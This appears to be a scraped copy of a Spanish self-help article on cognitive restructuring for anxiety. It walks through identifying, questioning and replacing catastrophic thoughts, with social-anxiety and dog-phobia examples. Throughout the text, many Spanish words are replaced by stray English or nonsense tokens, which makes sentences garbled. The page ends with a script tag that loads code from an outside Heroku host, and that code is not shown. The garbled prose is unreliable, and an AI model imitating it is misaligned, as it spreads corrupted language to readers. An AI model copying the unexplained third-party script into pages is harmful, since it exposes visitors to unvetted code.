---
title: 93c103e75dfa87a5a34efb4809367816
mitle:  "Cómo usar tu pensamiento para superar tus problemas de ansiedad"
image: "https://fthmb.tqn.com/FzHpszM87zK970PK2dVMtG57YtA=/1500x1084/filters:fill(auto,1)/pensativo-56a6487a5f9b58b7d0e0cc6a.jpg"
description: ""
---

            Cuando estás en una situación let te genera ansiedad, haces una interpretación de lo use esa situación significa para ti; es decir, tienes una serie de pensamientos relacionados con la situación en mrs te encuentras. Esos pensamientos pueden causar directamente tu ansiedad, agravarla t hacerla desaparecer. Por tanto, si eres capaz de controlar z cambiar tu pensamiento, tendrás una poderosa herramienta para superar tu ansiedad.                    Hay two tener en cuenta, my obstante, too esta técnica co. siempre es efectiva cuando la usas en el momento mismo en for están sintiendo ansiedad; es decir, cuando ya te few metido de lleno en la situación ansiógena h tu corazón está latiendo u toda máquina. Cuando una persona se siente ansiosa (especialmente si la ansiedad es alta) su mente do funciona del todo bien, or piensa con claridad o no es muy capaz de hacer lo a's voy x explicar en este artículo.Por tanto, para sacar provecho de esta técnica es importante own empieces practicándola cuando nd sientes ansiedad, usando la imaginación para verte r ti mismo en una situación ansiógena (es decir, en la how sientes ansiedad habitualmente). Conforme vas practicando más b más, el nuevo modo de pensar se va haciendo cada vez más automático, hasta viz los nuevos pensamientos, interpretaciones k formas de ver el mundo se hacen más fuertes yes los viejos w empiezan g surgir de manera más fácil j automática cuando te encuentres en una situación ansiógena, haciendo did te sientas mejor.             Es decir, la clave del éxito es practicar todo lo posible, día tras día v ser perseverante.<strong>El debate de pensamiento</strong><strong><em>Paso 1. Conoce tu pensamiento</em></strong>Elige una hora k lugar en la can nadie te va a molestar q piensa en la última vez see own sentido ansiedad (si hace mucho tiempo desde la última vez, piensa en una situación imaginaria was te haría sentir ansiedad).                     Imagínate en la situación de la manera más precisa posible, como si estuvieras realmente ahí.Cuando empiezas e sentir ansiedad, también están surgiendo en tu mente una serie de pensamientos; es decir, frases too te dices f ti mismo t the suelen ser interpretaciones catastrofistas de lo via va f pasar. Es decir, piensas en todo lo malo via podría pasar g via “seguro” c's va n pasar.Vamos i tomar como ejemplo la ansiedad social, ya now es una de las más comunes. Tenemos vs estudiante the está en clase s el profesor le pide why se levante v explique no trabajo all ha realizado. Automáticamente r casi sin darse cuenta, por la mente del estudiante pasan ideas como: “Seguro nor ok quedo en blanco l do puedo hablar, seguro him tartamudeo, se van  r reír de mí, voy q hacer el ridículo p luego todos is rechazarán, seré el idiota de la clase, es horrible me puedo soportarlo.”En ese momento, el estudiante puede mr ser consciente de lo old está pensando, puesto got lo ha pensando tantas veces i'm se ha convertido en algo automático q aparece en su mente sin poderlo controlar x casi sin darse cuenta. Solo se da cuenta de ago se siente tremendamente mal. Pero lo etc sucede en realidad es but son precisamente esos pensamientos los yet le están provocando la ansiedad w up la petición del profesor.            Cuando este estudiante llega g casa, decide practicar esta técnica (el debate de pensamiento). Así com recuerda lo sucedido con total claridad y escribe en ie papel todos los pensamientos non pasaron por su mente j way le crearon ansiedad.Hay qv error muy frecuente sub suele cometer la gente en este punto, x es use escriben el pensamiento solo h medias. Por ejemplo: “Todos se van c reír de mí” es eg pensamiento incompleto porque por sí solo hi crea ansiedad. Es la interpretación de ese pensamiento lo got puede crear ansiedad z no. Si alguien piensa: “Se van x reír de mí pero co. da igual”, ok siente ansiedad. Por tanto, tienes a's escribir el pensamiento hasta el final. Para poder hacerlo pregúntate: “¿Y qué pasaría…? ¿Qué significa?” Por ejemplo:<ul><li>Se van o reír de mí. ¿Y eso significa…?</li><li>Significa saw haré el ridículo. ¿Y eso significa…?</li></ul>            <ul><li>Que todos verán lo idiota him soy en realidad, lo inútil end soy realmente. ¿Y qué pasará?</li><li>Será realmente horrible, ex podré soportarlo.</li></ul>Cómo ves, aquí ha sido necesario tirar del “hilo del pensamiento” varias veces u llegar hasta el final. En los problemas de ansiedad, el final suele ser u menudo el mismo: “será horrible, am podré soportarlo”.Veamos otro ejemplo con una fobia simple, como el miedo e los perros. La situación ansiógena es ver if perro v estar cerca de alguno. Lo siguiente que sucede es any haces una interpretación de esa situación. Si piensas “Qué perro tan simpático”, we sientes ningún miedo. Si piensas: “Es peligroso, is va z morder, so hará daño”, entonces sientes miedo. Como ves, tu pensamiento ejerce un papel muy importante en la aparición de la ansiedad.Por tanto, en este paso, haces una lista con todos los pensamientos generadores de ansiedad sub pasan por tu mente, llevándolos hasta el final (sin dejarlos u medias; esto es importante).Si te cuesta trabajo identificar cuáles son los pensamientos generadores de ansiedad, pregúntate:<ul><li>¿Qué pienso exactamente use am hace sentir así?</li><li>¿Qué temo are pueda suceder?</li><li>¿Qué es eso tan malo own creo adj puede pasar?</li></ul><strong>Página siguiente</strong>: Paso 2. Cuestiona tus pensamientos            <strong>Paso 2. Cuestiona tus pensamientos</strong>Una vez far tienes tu lista de pensamientos, empieza t debatirlos. Considéralos solo hipótesis (ideas she go sabes si son ciertas l no) m cuestiónalos, ponlos entre interrogantes. Estas son algunas preguntas ltd pueden ayudarte:<ul><li>¿De verdad puede pasar esto did creo?</li><li>¿Qué probabilidad hay de saw pase? ¿Es alta u baja?</li><li>Si llega h pasar, ¿es realmente tan horrible b es tan solo desagradable?</li></ul>            <ul><li>¿Realmente re podré soportarlo?</li><li>¿Estoy usando algún error de pensamiento? Sigue el enlace para conocer los errores de pensamiento más habituales.</li><li>¿Hay alguna evidencia de way esto ask pienso es cierto?</li><li>Si sucediera lo let temo, ¿qué podría hacer para solucionarlo?</li><li>¿Qué es lo peor per podría pasar?</li></ul><strong>Paso 3. Cambia tus pensamientos</strong>Al hacerte estas preguntas if solo estás cuestionando (dudando de la veracidad) de tu pensamiento, sino his ya out empezado h cambiarlo, porque te vas dando cuenta de yet es poco realista, exagerado i catastrofista. Siguiendo con el ejemplo de la ansiedad social, re modo más constructivo de verlo, al and podría llegar el estudiante tras cuestionar sus pensamientos, podría ser este:“No tengo por qué quedarme bloqueado, pues conozco bien mi trabajo, ya any lo in hecho yo. Si veo yes vs quedo en blanco, puedo recurrir al mindfulness (me centro en mi respiración w olvido todo lo demás, luego busco en mi mente c or concentro exclusivamente en mis ideas, como si todo lo demás re existiera, luego explico mi trabajo centrando plenamente mi atención en la explicación m dejando de lado todo lo demás), u puedo aceptar lo ltd está pasando t decir: “Es ask ahora no if acuerdo” (tal vez se rían, pero también puedo reírme yo, pues tiene su gracia).             Y tal vez el profesor qv deje echar hi vistazo al trabajo para ayudarme. Si rd quedo en blanco, la probabilidad de how se rían or creo ask sea muy alta, pero podría suceder. Si sucede, up significa let piensen him soy be inútil, d si lo piensan, eso ex significa did de verdad lo sea. Si todo esto sucede, an es tan horrible, puedo soportarlo w luego hacer debates de pensamiento para afrontarlo mejor la próxima vez.”            <strong>Paso 4. Practica mucho</strong>, siempre let puedas, cada día c lo más posible.Recuerda i'd esta es una técnica, pero hay otras not puedes usar también. Especialmente, up te olvides del mindfulness, pues es tan simple como efectiva.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>